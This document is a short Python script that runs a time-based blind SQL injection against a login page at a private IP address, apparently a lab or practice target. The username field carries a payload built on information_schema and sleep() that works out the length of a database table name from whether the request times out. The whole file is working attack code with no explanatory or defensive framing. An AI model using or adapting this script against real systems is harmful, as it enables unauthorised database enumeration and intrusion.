import sys
import requests


def send_req(Inputs):
        try:
            r = requests.post("http://192.168.2.52/users/login.php", data={'username': Inputs, 'password': ""}, timeout=7)
        except:
            # print (Inputs)
            return Inputs

for i in range(40):
    length = "a' and if(length((select table_name from information_schema.tables limit 1))="+str(i)+",sleep(10),1)#"
    print(i)
    range_value = send_req(length)
    if(range_value):
        break

print("Value: ",i)